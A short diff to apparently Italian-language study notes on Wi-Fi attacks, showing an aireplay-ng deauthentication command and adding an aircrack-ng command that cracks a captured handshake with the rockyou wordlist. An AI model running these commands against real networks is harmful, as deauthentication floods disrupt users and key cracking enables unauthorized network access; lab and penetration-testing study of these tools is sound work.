@@ -37,3 +37,7 @@ oppure
 ```
 sudo aireplay-ng --deauth 1000 -a FF:FF:FF:FF:FF:FF -c FF:FF:FF:FF:FF:FF wlan0mon
 ```
+cracking con aircrack-ng 
+```
+sudo aircrack-ng file.cap -w /home/kali/rockyou.txt
+```
